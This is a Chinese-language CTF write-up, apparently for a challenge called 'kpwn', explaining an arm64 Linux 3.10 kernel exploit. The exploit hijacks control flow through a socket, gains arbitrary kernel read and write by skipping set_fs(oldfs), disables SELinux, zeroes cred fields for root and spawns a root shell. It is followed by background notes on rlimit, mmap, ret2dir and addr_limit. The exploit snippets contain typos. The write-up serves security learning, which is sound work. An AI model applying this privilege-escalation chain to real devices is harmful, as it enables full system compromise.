kernel_setsockopt()函数（*函数地址为0xFFFFFFC00035D788*）中调用了set_fs(KERNEL_DS)，并且通过适当设置寄存器可以跳过setfs(oldfs)这行代码。《addr limit访问限制》章节中“kernel_setsockopt”小节，详细说明了本题的利用方法。\n\n  发生控制流劫持时，x0的值为sock的地址，[x0,#0x28]处存的还是sock地址，所以x5也是sock地址。因此将[x5,#0x68]处存上0xFFFFFFC00035D7C0，相当于给mmap_page+0x68处存上这个值。\n\n  ```\n  ROM:FFFFFFC00035D7B0                 LDR             X5, [X0,#0x28]\n  ROM:FFFFFFC00035D7B4                 LDR             X5, [X5,#0x68]\n  ROM:FFFFFFC00035D7B8                 BLR             X5\n  ROM:FFFFFFC00035D7BC                 STR             X20, [X19,#8]\n  ROM:FFFFFFC00035D7C0                 LDP             X19, X20, [SP,#var_s10]\n  ```\n\n  在步骤1执行close(exp_sock)之前，布置好将要使用到的值。使其执行kernel_setsockopt()函数，并跳过set_fs(oldfs)这一句。\n\n  ```c\n  \t*(unsigned long *)((char*)payload + 0x290) = 0;\n  \t*(unsigned long *)((char*)payload) = (unsigned long)0xFFFFFFC00035D788;\n  \t*(unsigned long *)((char*)payload + 0x28) = payload;\n  \t*(unsigned long *)((char*)payload + 0x68) = (unsigned long)0xFFFFFFC00035D7C0;\n  \tclose(exp_sock);\n  \tprintf(\"[*] now we can R/W kernel address space like a boss.\\n\");\n  ```\n\n- 通过pipe系统调用，任意读写内核\n\n  封装两个函数，用户态程序通过调用它们，就能实现对任意内核地址的读写。\n\n  ```c\n  int kernel_read(void* kernel_addr, unsigned long* value, usigned int len){\n  \tint pipefd[2];\n  \tpipe(pipefd);\n  \twrite(pipe[1],kernel_addr,len);\n  \tread(pipe[0],value,len);\n  \treturn 0;\n  }\n  \n  int kernel_write(void* kernel_addr, unsigned long* value, usigned int len){\n  \tint pipefd[2];\n  \tpipe(pipefd);\n  \twrite(pipe[1],value,len);\n  \tread(pipe[0],kernel_addr,len);\n  \treturn 0;\n  }\n  ```\n\n该步骤的源码参考：[步骤二的源码](step2.c)\n\n选择内核数据段0xFFFFFFC000580860，写入0xdeadbeefdeadbeef，并成功读出。效果如下图所示：\n\n![image-20220918193452306](image-20220918193452306.png?size=600)\n\n\n\n## 步骤3. 关闭selinux\n\n通过`sel_read_enforce()`函数，可以定位到`selinux_enforcing`的地址，为0xFFFFFFC00065399C。\n\n```\n__int64 __fastcall sel_read_enforce(__int64 a1, __int64 a2, __int64 a3, __int64 a4)\n{\n  int v7; // w0\n  _BYTE v9[16]; // [xsp+30h] [xbp+30h] BYREF\n\n  v7 = scnprintf(v9, 12i64, \"%d\", MEMORY[0xFFFFFFC00065399C]);\n    //0xFFFFFFC00065399C即selinux_enforcing\n  return simple_read_from_buffer(a2, a3, a4, v9, v7);\n}\n```\n\n通过如下代码片段实现关闭selinux：\n\n```\n\tunsigned int set_selinux = 0;\n\tkernel_write((void*)0xFFFFFFC00065399C,&set_selinux,4);\n```\n\n该步骤的源码参考：[步骤三的源码](step3.c)\n\n先读取selinux_enforcing的值，为1，表示开启了selinux。然后设置selinux_enforcing为0，并读取，发现设置成功。效果如下图所示：\n\n![image-20220918200706532](image-20220918200706532.png?size=600)\n\n\n\n## 步骤4. 获取cred/real_cred地址\n\n为了给当前进程提权，需要改cred结构体的信息。因此，先获取task_struct结构体的地址，再通过偏移定位到cred的存放地址。\n\n- 泄露[task_struct结构体](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/sched.h#L1041)的地址\n\n  task_struct的地址在[thread_info结构体](https://elixir.bootlin.com/linux/v3.10.108/source/arch/arm64/include/asm/thread_info.h#L46)中存储着，而thread_info结构体地址跟内核栈地址是相同的。arm64系统上，内核栈的最大深度为16K。`sp&0xFFFFFFFFFFFFC000`即可得到thread_info的地址，task_struct在thread_info结构体中的偏移是0x10。\n\n  本题Image中，找到如下代码片段，可通过`sp&0xFFFFFFFFFFFFC000`计算将task_struct的地址写到`X1+0x18`地址处。\n\n  ```assembly\n  # mutex_trylock函数\n  ROM:FFFFFFC0004AA518                 MOV             X2, SP\n  ROM:FFFFFFC0004AA51C                 AND             X2, X2, #0xFFFFFFFFFFFFC000\n  ROM:FFFFFFC0004AA520                 LDR             X2, [X2,#0x10]\n  ROM:FFFFFFC0004AA524                 STR             X2, [X1,#0x18]\n  ROM:FFFFFFC0004AA528                 RET\n  ```\n\n  由于控制流劫持时，x1寄存器中的值为0，因此task_struct的地址将被写入0x18地址处。\n\n  那么需要提前mmap小于4096的地址，而系统通常会禁止mmap低地址，所以需要改mmap_min_addr的值，将其改成0。通过逆向Image镜像，可以找到mmap_min_addr的值为0xFFFFFFC000652148。\n\n  ```c\n  __int64 mmap_min_addr_handler()\n  {\n    __int64 result; // x0\n  \n    result = proc_doulongvec_minmax();\n    MEMORY[0xFFFFFFC000652148] = 4096i64;\t\t\t// 0xFFFFFFC000652148就是mmap_min_addr的地址\n    return result;\n  }\n  ```\n\n  读取task_struct地址的代码如下：\n\n  ```c\n  \t// set mmap_min_addr\n  \tunsigned long set_mmap_min = 0;\n  \tkernel_write((void*)0xFFFFFFC000652148,&set_mmap_min,8);\n  \tuser_mm = mmap((void*)0x0,PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);\n  \n  \t// leak struct_cred address to 0x18\n  \texp_sock = search_exploitable_socket(&exp_sock_index,&payload);\n  \tif(exp_sock == -1){\n  \t\tprintf(\"cannot find target socket\\n\");\n  \t}else{\n  \t\tprintf(\"find it 2!!! exp_sock_index: 0x%x\\n\",exp_sock_index);\n  \t}\n  \t*(unsigned long *)((char*)payload + 0x290) = 0;\n  \t*(unsigned long *)((char*)payload) = (unsigned long)0xFFFFFFC0004AA518;\n  \t*(unsigned long *)((char*)payload + 0x28) = payload;\n  \tclose(exp_sock);\n  \n  \t// read task_struct address\n  \tvoid* task_struct_addr = 0;\n  \ttask_struct_addr = (void*)*(unsigned long*)((char*)user_mm+0x18);\n  \tprintf(\"task_struct addr is : %p\\n\",task_struct_addr);\n  ```\n\n- 泄露cred/real_cred地址\n\n  根据cred/real_cred在task_struct中的偏移，获取cred/real_cred结构体的地址。\n\n  上一步获得了`task_struct task`的地址，通过`exit_creds()`函数得知task->real_cred的偏移是0x398。（`real_cred` 与 `cred` 指向的位置是相同的）\n\n  ```c\n  // IDA伪代码\n  unsigned int *__fastcall exit_creds(__int64 a1)\n  {\n    unsigned int *v2; // x0\n    unsigned int v3; // w1\n    unsigned int v4; // w1\n    unsigned int *result; // x0\n    unsigned int v6; // w1\n    unsigned int v7; // w1\n  \n    v2 = *(unsigned int **)(a1 + 0x398);\n    *(_QWORD *)(a1 + 0x398) = 0i64;\n    do\n    {\n      v3 = __ldaxr(v2);\n      v4 = v3 - 1;\n    }\n  ...\n  }\n  // C源代码\n  void exit_creds(struct task_struct *tsk)\n  {\n  \tstruct cred *cred;\n  \tcred = (struct cred *) tsk->real_cred;\n  \ttsk->real_cred = NULL;\n  \tvalidate_creds(cred);\n  ...\n  }\n  ```\n\n  所以，通过我们封装的内核任意地址读函数，real_cred的地址，代码片段如下\n\n  ```c\n  \tvoid* cred_addr = 0;\n  \tkernel_read((char*)task_struct_addr+0x398,&cred_addr,8);\n  \tprintf(\"cred addr: %p\\n\",cred_addr);\n  ```\n\n该步骤的源码参考：[步骤四的源码](step4.c)\n\n运行结果如下图所示，成功泄露了task_struct和cred结构体的地址。\n\n![image-20220920175812155](image-20220920175812155.png?size=600)\n\n\n\n\n\n## 步骤5. 进程提权\n\n获取到cred/real_cred结构体的地址后，剩下的事情就变得简单了。\n\n[cred结构体](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/cred.h#L103)如下，将`uid,gid,suid,sgid,euid,egid,fsuid,fsgid`全都改成0，即可完成本进程的提权。\n\n```c\nstruct cred {\n\tatomic_t\tusage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n\tatomic_t\tsubscribers;\t/* number of processes subscribed */\n\tvoid\t\t*put_addr;\n\tunsigned\tmagic;\n#define CRED_MAGIC\t0x43736564\n#define CRED_MAGIC_DEAD\t0x44656144\n#endif\n\tkuid_t\t\tuid;\t\t/* real UID of the task */\n\tkgid_t\t\tgid;\t\t/* real GID of the task */\n\tkuid_t\t\tsuid;\t\t/* saved UID of the task */\n\tkgid_t\t\tsgid;\t\t/* saved GID of the task */\n\tkuid_t\t\teuid;\t\t/* effective UID of the task */\n\tkgid_t\t\tegid;\t\t/* effective GID of the task */\n\tkuid_t\t\tfsuid;\t\t/* UID for VFS ops */\n\tkgid_t\t\tfsgid;\t\t/* GID for VFS ops */\n\t// ......\n};\n```\n\n本部分代码片段如下：\n\n```c\n\t// set cred to get root\n\tint a = 0;\n\tkernel_write((char*)cred_addr+4,&a,4);\n\tkernel_write((char*)cred_addr+8,&a,4);\n\tkernel_write((char*)cred_addr+12,&a,4);\n\tkernel_write((char*)cred_addr+16,&a,4);\t\n\tkernel_write((char*)cred_addr+20,&a,4);\n\tkernel_write((char*)cred_addr+24,&a,4);\n\tkernel_write((char*)cred_addr+28,&a,4);\n\tkernel_write((char*)cred_addr+32,&a,4);\t\n\n\tif(getuid() == 0){\n\t\tprintf(\"now the uid is 0\\n\");\n\t}else{\n\t\tprintf(\"failed\\n\");\n\t}\n```\n\n该步骤的源码参考：[步骤五的源码](step5.c)\n\n![image-20220920182949779](image-20220920182949779.png?size=600)\n\n\n\n## 步骤6. 稳定shell\n\n[Module to print the open files of a process](https://tuxthink.blogspot.com/2012/05/module-to-print-open-files-of-process.html)\n\ntask_struct->files->fdt->max_fds存储着当前进程打开的文件个数信息（猜测当进程退出时会根据该信息，依次关闭各个打开的文件）。为防止其他socket关闭时crash，我们需要将该值改为0。\n\n[files_struct结构体](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/fdtable.h#L45)\n\n- 确定`files_struct *files`在`tast_struct`中的偏移\n\n  `get_files_struct()`函数中通过使用了files_struct，通过比对，得到本题中files_struct在tast_struct中的偏移量为0x788字节。\n\n  ```c\n  // 在linux 3.10的源码中找到如下函数，调用了task->files\n  struct files_struct *get_files_struct(struct task_struct *task)\n  {\n  \tstruct files_struct *files;\n  \n  \ttask_lock(task);\n  \tfiles = task->files;\n  \tif (files)\n  \t\tatomic_inc(&files->count);\n  \ttask_unlock(task);\n  \n  \treturn files;\n  }\n  // 在Image中找到对应的伪代码，确认files在task_struct中的偏移量是0x788\n  unsigned int *__fastcall get_files_struct(__int64 a1)\n  {\n    __int64 v2; // x20\n    unsigned int *v3; // x19\n    unsigned int v4; // w0\n  \n    v2 = a1 + 0x818;\n    raw_spin_lock(a1 + 0x818);\n    v3 = *(unsigned int **)(a1 + 0x788);\t\t// files = task->files\n    if ( v3 )\n    {\n      do\n        v4 = __ldxr(v3);\n      while ( __stxr(v4 + 1, v3) );\n    }\n    raw_spin_unlock(v2);\n    return v3;\n  }\n  ```\n\n- 确定`fdtable *fdt`在`files_struct`中的偏移\n\n  `do_dup2()`函数中使用到了fdt，如下代码段。所以本题环境中，`fdtable *fdt`在`files_struct`中的偏移量为8字节。\n\n  ```c\n  // 源码\n  static int do_dup2(struct files_struct *files,\n  \tstruct file *file, unsigned fd, unsigned flags)\n  {\n  \tstruct file *tofree;\n  \tstruct fdtable *fdt;\n  \tfdt = files_fdtable(files);\n  \ttofree = fdt->fd[fd];\n  \t// ......\n  }\n  // IDA伪代码\n  __int64 __fastcall do_dup2(__int64 a1, __int64 a2, int a3, int a4)\n  {\n    // ......\n    v5 = 8i64 * (unsigned int)a3;\n    v6 = *(_QWORD **)(a1 + 8);\t//从file_struct偏移8字节的位置，取出fdt的地址\n    v7 = *(_QWORD *)(v6[1] + v5);\n    // ......\n  }\n  ```\n\n根据以上信息，可通过如下代码片段，清理打开的socket fd，避免内核crash。\n\n```c\n\t// clean fds\n\tvoid* files_struct_addr = 0;\n\tvoid* fdtable_addr = 0;\n\tkernel_read((char*)task_struct_addr+0x788,&files_struct_addr,8);\n\tkernel_read((char*)files_struct_addr+8,&fdtalbe_addr,8);\n\n\tkernel_write(fdtable_addr,&a,4);\n```\n\n弹root shell\n\n```c\n\t// root shell\n\tif(getuid() == 0){\n\t\tsystem(\"/system/bin/sh\");\n\t}else{\n\t\tprintf(\"failed\\n\");\n\t}\n```\n\n完整利用代码：[步骤六源码](step6.c)\n\n效果如下：\n\n![image-20220921123726416](image-20220921123726416.png?size=600)\n\n# 知识点补充\n\n> 学习本题exp的过程中，补了不少知识点，全都记录在这里\n\n## linux rlimit资源限制\n\n[Linux rlimit 函数详解](https://blog.csdn.net/rikeyone/article/details/88798384)\n\n[Linux系统调用--getrlimit()与setrlimit()函数详解](https://www.cnblogs.com/niocai/archive/2012/04/01/2428128.html)\n\n操作系统能提供的资源有限，所以必须限制每个进程使用的资源数，在linux上这个机制叫做[rlimit](https://docs.oracle.com/cd/E19253-01/819-7053/faayq/index.html)。与之相关的一个结构体是：\n\n```c\nstruct rlimit {\n\t__kernel_ulong_t\trlim_cur;\t\t\t// soft limit \n\t__kernel_ulong_t\trlim_max;\t\t\t// hard limit\n};\n// soft limit <= hard limit\n// soft limit是普通用户可更改的，hard limit只有root用户才能更改\n```\n\n更改rlimit值有两种方式：\n\n- ulimit命令\n\n  > ulimit改变的是当前shell的resource limit，从而改变该shell启动的进程的resource limit\n\n  ```shell\n  # ulimit -a\n  time(cpu-seconds)    unlimited\n  file(blocks)         unlimited\n  coredump(blocks)     0\n  data(KiB)            unlimited\n  stack(KiB)           8192\n  lockedmem(KiB)       64\n  nofiles(descriptors) 1024\n  processes            4004\n  sigpending           4004\n  msgqueue(bytes)      819200\n  maxnice              40\n  maxrtprio            0\n  resident-set(KiB)    unlimited\n  address-space(KiB)   unlimited\n  ```\n\n- getlimit()和setlimit()两个API函数\n\n  ```c\n  // 更改soft limit的demo\n  #include <stdio.h>\n  #include <stdlib.h>\n  #include <sys/resource.h>\n  int main()\n  {\n  \tstruct rlimit rlim;\n  \tint ret;\n  \n  \tret = getrlimit(RLIMIT_NOFILE, &rlim);   // 读取RLIMIT_NOFILE这个资源的限制值\n  \n  //\tprintf(\"rlim.rlim_cur:%d\\n\",rlim.rlim_cur);\n  //\tprintf(\"rlim.rlim_max:%d\\n\",rlim.rlim_max);\n  \n  \trlim.rlim_cur = rlim.rlim_max;\n  \tsetrlimit(RLIMIT_NOFILE, &rlim);\t// 更改了soft limit后，重新写回内核\n  \n  \treturn 0;\n  }\n  ```\n\n\n以上是对当前进程的resource limit进行修改，那么当我们需要更改其他进程的resource limit时，应该怎么办呢？对于高版本内核，可以使用prlimit()函数或prlimit命令。\n\n查看某一进程的resource limit：`cat /proc/<pid>/limits`\n\n\n\n\n\n\n\n## mmap函数\n\n[认真分析mmap：是什么 为什么 怎么用 ](https://www.cnblogs.com/huxiao-tee/p/4660352.html)\n\n[Linux 内存映射函数 mmap（）函数详解](https://www.cnblogs.com/xueqiuqiu/articles/12884736.html)\n\n[你真的知道匿名映射是什么吗？](https://www.jianshu.com/p/b24265a3a222)\n\nmmap将文件或设备映射进内存。但是对安全研究员来说，用的最多的是它的匿名映射（不将映射区与任何文件关联）。函数原型如下：\n\n```c\nvoid *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);\n// start：映射区的开始地址。如果指定为NULL代表让系统自动选定地址，映射成功后返回该地址\n// length：映射区的长度\n// prot：期望的内存保护标志，不能与文件的打开模式冲突。PROT_EXEC/PROT_READ/PROT_WRITE/PROT_NONE\n// flags：指定映射对象的类型，映射选项和映射页是否可以共享。MAP_FIXED/MAP_SHARED/MAP_PRIVATE/MAP_ANONYMOUS等\n// fd：有效的文件描述词。如果MAP_ANONYMOUS被设定，为了兼容问题，其值应为-1\n// offset：被映射对象内容的起点\n```\n\n匿名映射是指在flags中指定了`MAP_ANONYMOUS`，并且fd被置为-1的情况。\n\n## mmap_min_addr\n\n[mmap x86小于0x10000的虚地址](http://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html)\n\n使用`cat /proc/sys/vm/mmap_min_addr`查看当前系统中允许mmap的最低地址。有两种方法可以改变这个限制：\n\n1. 通过`echo 4096 > /proc/sys/vm/mmap_min_addr`更改最低地址的限制。\n\n2. 劫持内核控制流，更改mmap_min_addr的值\n\n   ```c\n   __int64 mmap_min_addr_handler()\n   {\n     __int64 result; // x0\n   \n     result = proc_doulongvec_minmax();\n     MEMORY[0xFFFFFFC000652148] = 4096i64;\t\t\t// 0xFFFFFFC000652148就是mmap_min_addr的地址\n     return result;\n   }\n   ```\n\n   \n\n## ret2dir\n\n> 提出ret2dir这种利用方法的论文（USENIX 2014）：[ret2dir: Rethinking Kernel Isolation](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf)\n\nret2dir中一个关键技术叫physmap spray。\n\nphysmap是64位linux内核内存布局中的一个区域，该区域内存比较特殊，称作\"direct mapping of all physical memory\"，大小是64TB。也就是说任意物理内存地址都可以映射到physmap虚拟内存中。\n\n利用physmap这一区域，可以绕过一些linux内核漏洞缓解措施，如SMAP，SMEP等。攻击者通过mmap将payload放入虚拟内存（也在物理内存中），相应地一定能在physmap中找到这些payload，从而达到在内核中访问用户态数据或执行用户态代码的目的。\n\n通过如下文章中的小实验来了解physmap：\n\n- [【linux内核漏洞利用】ret2dir利用方法](https://www.jianshu.com/p/3c662b6163a7)\n\n- [linux kernel pwn 之 ret2dir 学习](https://www.anquanke.com/post/id/185408)\n\n在对physmap的研究过程中，有以下几个问题：\n\n- kmalloc的内存是否在physmap区域？\n\n  ```\n  在x86_64位ubuntu20.04虚拟机中，验证证明内核中kmalloc的内存在physmap区域。\n  ```\n\n- mmap的内存是否在physmap区域？\n\n  ```\n  通过gdb dump内存，看到了mmap虚拟内存对应的内容\n  ```\n\n- mmap的内存，与kmalloc的内存，它们在physmap中的分布特点？\n\n  ```\n  - kmalloc分配的内存遵循SLUB分配器的原则\n  - mmap出来的内存，在vmware ubuntu中以1k为单位块，无规则分布在physmap区域（因为在物理内存中分布不均匀？）\n  ```\n\n如果kmalloc的内存存在UAF，用户态mmap的大量内存在物理上可能跟UAF的某些区域有重叠。于是，就达到了在用户态操作mmap内存，能控制内核UAF堆中数据的目的。这也是CVE-2015-3636漏洞利用中，physmap spray使用到的根本原理。\n\n但是，涉及到linux内核内存管理的知识，目前我的储备为0，所以细节方面无法展开说明。这一知识盲区留待后续研究linux内存管理时再深入调试探究，参考这篇文章中提供的书籍和帖子学习：[What's inside the kernel part of virtual memory of 64 bit linux processes?](https://unix.stackexchange.com/questions/512849/whats-inside-the-kernel-part-of-virtual-memory-of-64-bit-linux-processes)\n\n\n\n？？？但是，从kpwn这个题的环境来看，跟https://bbs.pediy.com/thread-230298.htm中对physmap和slab的描述并不一样。\n\n？？？kpwn：kmalloc的内存就在physmap中\n\n？？？看雪：kmalloc的内存需要通过lifting才能跟physmap产生交集\n\n\n\n\n\n## socket的inet_ioctl\n\n### inet_ioctl\n\nlinux-3.10-rc1/net/ipv4/af_inet.c中，有以下接口：\n\n```c\nint inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)\n{\n\tstruct sock *sk = sock->sk;\n\tint err = 0;\n\tstruct net *net = sock_net(sk);\n\n\tswitch (cmd) {\n\tcase SIOCGSTAMP:\n\t\terr = sock_get_timestamp(sk, (struct timeval __user *)arg);\n\t\tbreak;\n\tcase SIOCGSTAMPNS:\n\t\terr = sock_get_timestampns(sk, (struct timespec __user *)arg);\n\t\tbreak;\n\t······\n```\n\n### sock_get_timestampns\n\nlinux-3.10-rc1/net/core/sock.c中，实现了sock_get_timestampns函数\n\n```c\nstruct timespec {\n        time_t  tv_sec;         /* seconds */\n        long    tv_nsec;        /* nanoseconds */\n};\n\nint sock_get_timestampns(struct sock *sk, struct timespec __user *userstamp)\n{\n\tstruct timespec ts;\n\tif (!sock_flag(sk, SOCK_TIMESTAMP))\n\t\tsock_enable_timestamp(sk, SOCK_TIMESTAMP);\n\tts = ktime_to_timespec(sk->sk_stamp);\n\tif (ts.tv_sec == -1)\n\t\treturn -ENOENT;\n\tif (ts.tv_sec == 0) {\n\t\tsk->sk_stamp = ktime_get_real();\n\t\tts = ktime_to_timespec(sk->sk_stamp);\n\t}\n\treturn copy_to_user(userstamp, &ts, sizeof(ts)) ? -EFAULT : 0;\n}\nEXPORT_SYMBOL(sock_get_timestampns);\n\n#if (BITS_PER_LONG == 64) || defined(CONFIG_KTIME_SCALAR)\n/* Map the ktime_t to timespec conversion to ns_to_timespec function */\n#define ktime_to_timespec(kt)\t\tns_to_timespec((kt).tv64)\n```\n\n### ns_to_timespec\n\nlinux-3.10-rc1/kernel/time.cz中，实现了ns_to_timespec函数\n\n```c\ntypedef union ktime ktime_t;\nunion ktime {\n\ts64\ttv64;\n#if BITS_PER_LONG != 64 && !defined(CONFIG_KTIME_SCALAR)\n\tstruct {\n# ifdef __BIG_ENDIAN\n\ts32\tsec, nsec;\n# else\n\ts32\tnsec, sec;\n# endif\n\t} tv;\n#endif\n};\n\nstruct timespec ns_to_timespec(const s64 nsec)\n{\n\tstruct timespec ts;\n\ts32 rem;\n\n\tif (!nsec)\n\t\treturn (struct timespec) {0, 0};\n\n\tts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);\n\tif (unlikely(rem < 0)) {\n\t\tts.tv_sec--;\n\t\trem += NSEC_PER_SEC;\n\t}\n\tts.tv_nsec = rem;\n\n\treturn ts;\n}\nEXPORT_SYMBOL(ns_to_timespec);\n```\n\n[Linux内核 ns_to_timespec()](https://www.coolcou.com/linux-kernel/linux-kernel-timing-mechanism-api/the-linux-kernel-ns-to-timespec.html)\n\n该函数的作用是将参数的时间（纳秒）用timespec结构体来表示，结构体如下\n\n```c\nstruct timespec\n{\n    __kernel_time_t       tv_sec;         /*秒数*/\n    long                    tv_nsec;        /*纳秒数*/\n};\n```\n\n通过编写一个简单的内核模块，弄明白这个函数的用法\n\n```c\n#include <linux/module.h>\n#include<linux/time.h>\n\nint __init ns_to_timespec_init(void)\n{\n\n    struct timespec ts;           //声明变量，用于保存函数执行结果\n    const s64 nsec=1001000000;    //1001000000，定义64位有符号整数，作为函数的参数\n    printk(\"ns_to_timespec begin.\\n\");\n    ts=ns_to_timespec(nsec);      //调用函数，将参数表示的时间转换成用timespec表示的时间\n    printk(\"the value of the struct timespec is:\\n\"); //显示转换结果\n    printk(\"the tv_sec value is:%ld\\n\", ts.tv_sec);    //秒数，为1\n    printk(\"the tv_nsec value is:%ld\\n\", ts.tv_nsec); //纳秒数，为1000000\n    printk(\"ns_to_timespec over.\\n\");\n    return 0;\n}\n\nvoid __exit ns_to_timespec_exit(void)\n{\n    printk(\"Goodbye ns_to_timespec\\n\");\n}\n\nmodule_init(ns_to_timespec_init);\nmodule_exit(ns_to_timespec_exit);\n\nMODULE_LICENSE(\"GPL\");\n```\n\n\n\n## addr limit访问限制\n\n### addr limit是什么\n\naddr_limit是thread_info中的一个值，它代表当前线程可访问的地址空间大小。x86_64架构下，在用户程序addr_limit为0x7ffffffff000，在内核addr_limit为0xffffffffffffffff。\n\n```c\ntypedef unsigned long mm_segment_t;\n\nstruct thread_info {\n\tunsigned long\t\tflags;\t\t/* low level flags */\n\tmm_segment_t\t\taddr_limit;\t/* address limit */\n\tstruct task_struct\t*task;\t\t/* main task structure */\n\tstruct exec_domain\t*exec_domain;\t/* execution domain */\n\tstruct restart_block\trestart_block;\n\tint\t\t\tpreempt_count;\t/* 0 => preemptable, <0 => bug */\n\tint\t\t\tcpu;\t\t/* cpu */\n};\n```\n\n当用户态程序通过系统调用进入内核后，需要访问内核空间的数据时该怎么办呢？\n\n> 答：可以通过setfs()来改变addr_limit的值。相关定义如下：\n>\n> ```c\n> #define KERNEL_DS    ((mm_segment_t) { ~0UL })        /* cf. access_ok() */\n> #define USER_DS        ((mm_segment_t) { TASK_SIZE-1 })    /* cf. access_ok() */\n> \n> #define VERIFY_READ    0\n> #define VERIFY_WRITE    1\n> \n> #define get_ds()  (KERNEL_DS)\n> #define get_fs()  (current_thread_info()->addr_limit)\n> #define set_fs(x) (current_thread_info()->addr_limit = (x))\n> \n> #define TASK_SIZE           DEFAULT_TASK_SIZE \n> ```\n\n[利用CVE-2017-8890漏洞ROOT天猫魔屏A1](https://blog.csdn.net/fu851523125/article/details/124738473)文章指出，当前有两种方式可以patch addr_limit的大小。这里我们关注第二种方法，通过调用了set_fs()的函数如kernel_setsockopt、kernel_sock_ioctl来更改addr_limit。\n\n### kernel_setsockopt\n\nkernel_setsockopt()函数的源码：\n\n```c\nint kernel_setsockopt(struct socket *sock, int level, int optname,\n\t\t\tchar *optval, unsigned int optlen)\n{\n\tmm_segment_t oldfs = get_fs();\n\tchar __user *uoptval;\n\tint err;\n\n\tuoptval = (char __user __force *) optval;\n\n\tset_fs(KERNEL_DS);\n\tif (level == SOL_SOCKET)\n\t\terr = sock_setsockopt(sock, level, optname, uoptval, optlen);\n\telse\n\t\terr = sock->ops->setsockopt(sock, level, optname, uoptval,\n\t\t\t\t\t    optlen);\n\tset_fs(oldfs);\n\treturn err;\n}\n```\n\n对应的汇编代码：\n\n```assembly\nROM:FFFFFFC00035D788 kernel_setsockopt                       ; CODE XREF: svc_setup_socket+238↓p\nROM:FFFFFFC00035D788                                         ; svc_setup_socket+37C↓p\nROM:FFFFFFC00035D788\nROM:FFFFFFC00035D788 var_s0          =  0\nROM:FFFFFFC00035D788 var_s10         =  0x10\nROM:FFFFFFC00035D788\nROM:FFFFFFC00035D788                 STP             X29, X30, [SP,#-0x20+var_s0]!\nROM:FFFFFFC00035D78C                 CMP             W1, #1\nROM:FFFFFFC00035D790                 MOV             X5, SP\nROM:FFFFFFC00035D794                 MOV             X29, SP\nROM:FFFFFFC00035D798                 STP             X19, X20, [SP,#var_s10]\nROM:FFFFFFC00035D79C                 AND             X19, X5, #0xFFFFFFFFFFFFC000\nROM:FFFFFFC00035D7A0                 MOV             X5, #0xFFFFFFFFFFFFFFFF\nROM:FFFFFFC00035D7A4                 LDR             X20, [X19,#8]\nROM:FFFFFFC00035D7A8                 STR             X5, [X19,#8]\nROM:FFFFFFC00035D7AC                 B.EQ            loc_FFFFFFC00035D7CC\nROM:FFFFFFC00035D7B0                 LDR             X5, [X0,#0x28]\nROM:FFFFFFC00035D7B4                 LDR             X5, [X5,#0x68]\nROM:FFFFFFC00035D7B8                 BLR             X5\nROM:FFFFFFC00035D7BC                 STR             X20, [X19,#8]\nROM:FFFFFFC00035D7C0                 LDP             X19, X20, [SP,#var_s10]\nROM:FFFFFFC00035D7C4                 LDP             X29, X30, [SP+var_s0],#0x20\nROM:FFFFFFC00035D7C8                 RET\n```\n\n`ROM:FFFFFFC00035D7BC STR X20, [X19,#8]`这行对应于`set_fs(oldfs);`，跳过这一句，用户态进程对应的addr_limit就成了`0xFFFFFFFFFFFFFFFF`，可以访问内核空间了。\n\n也就是说将x5设置为0xFFFFFFC00035D7C0即可，那么要求[x5,#0x68]处存放0xFFFFFFC00035D7C0。x0是控制流劫持发生时的残留值，可根据实际情况变更。\n\n### pipe系统调用\n\n[pipe() 系统调用](https://www.jianshu.com/p/350dc21fe5e3)\n\n通过pipe()创建一个管道，返回两个文件描述符，fd[0]为读，fd[1]为写。\n\n```c\nint kernel_read4(void* kernel_addr,  unsigned int* value)\n{\n    int pipefd[2];\n    pipe(pipefd)\n    write(pipefd[1], kernel_addr, 4)\n\tread(pipefd[0], value, 4)\n    return 0;\n}\n\nint kernel_write4(void* kernel_addr, unsigned int* value)\n{\n    int pipefd[2];\n    pipe(pipefd)\n    write(pipefd[1], value, 4)\n    read(pipefd[0], kernel_addr, 4)\n    return 0;\n}\n```\n\n\n\n\n\n## 关闭selinux\n\n如何查看selinux状态？\n\n> `/usr/sbin/sestatus -v `或者`getenforce`\n\n通过内核镜像中，如selinux_init()、sel_read_enforce()、sel_write_enforce()等函数，可以定位到selinux_enforcing的内存地址。\n\n- selinux_enforcing为0，SELinux为permissive模式\n- selinux_enforcing为1，SELinux为enforcing模式\n\n```c\n// IDA中伪代码如下\n__int64 __fastcall sel_read_enforce(__int64 a1, __int64 a2, __int64 a3, __int64 a4)\n{\n  int v7; // w0\n  _BYTE v9[16]; // [xsp+30h] [xbp+30h] BYREF\n\n  v7 = scnprintf(v9, 12i64, \"%d\", MEMORY[0xFFFFFFC00065399C]);\n    //0xFFFFFFC00065399C即selinux_enforcing\n  return simple_read_from_buffer(a2, a3, a4, v9, v7);\n}\n// 对应的源码如下\nstatic ssize_t sel_read_enforce(struct file *filp, char __user *buf,\n\t\t\t\tsize_t count, loff_t *ppos)\n{\n\tchar tmpbuf[TMPBUFLEN];\n\tssize_t length;\n\n\tlength = scnprintf(tmpbuf, TMPBUFLEN, \"%d\", selinux_enforcing);\n\treturn simple_read_from_buffer(buf, count, ppos, tmpbuf, length);\n}\n```\n\n\n\n## thread_info与task_struct\n\n### task_struct\n\n[task_struct结构体](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/sched.h#L1041)中，除了漏洞利用提权时比较关注的cred结构体以外，还有个特殊的指针`void *stack`，它指向内核栈，同时也是thread_info结构体的存放地址。\n\n```c\nstruct task_struct {\n\tvolatile long state;\t/* -1 unrunnable, 0 runnable, >0 stopped */\n\tvoid *stack;\t\t\t\n\tatomic_t usage;\n    \n\tunsigned int flags;\t/* per process flags, defined below */\n\tunsigned int ptrace;\n\t// ......\n    /* process credentials */\n\tconst struct cred __rcu *real_cred; /* objective and real subjective task\n\t\t\t\t\t * credentials (COW) */\n\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\n\t\t\t\t\t * credentials (COW) */\n    // ......\n}\n```\n\n`void 